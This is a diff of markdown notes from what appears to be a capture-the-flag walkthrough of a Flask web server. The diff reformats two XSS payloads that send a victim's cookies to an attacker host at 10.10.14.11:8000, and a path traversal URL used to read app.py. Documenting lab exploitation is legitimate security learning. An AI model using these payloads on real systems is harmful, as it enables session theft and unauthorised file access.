@@ -105,9 +105,13 @@ Port 22/SSH and Port 8000/HTTP Flask Server
 [00:22:58] Seeing if we can do subdomain host in URL
 [00:27:08] Oh theere is a bug report link which I've missed
 
-<img src=x onerror=“new Image().src=‘http://10.10.14.11:8000/?=‘+encodeURIComponent(document.cookie)">
+
+```html
+<img src=x onerror=“new Image().src=‘http://10.10.14.11:8000/=‘+encodeURIComponent(document.cookie)">
 
 <img src=x onerror=fetch('http://10.10.14.11:8000/?c='+btoa(document.cookie))>
+```
+
 
 [00:48:28] The above fetched me cookie in base64 and I've decoded and navigated to /admin/users . And this is what I got
 
@@ -164,7 +168,7 @@ Port 22/SSH and Port 8000/HTTP Flask Server
 
 [09:45:40] Maybe we can get .flaskenv if we get the root dir right. Tried but didn't
 [09:48:00] But I got app.py
-	- http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py
+	- `http://10.10.11.88:8000/admin/get_system_log?log_identifier=../app.py`
 
 [09:49:30] NOthing fancy from app.py . Downloaded config.py
 	- We get this DATA_STORE_PATH = 'db.json'
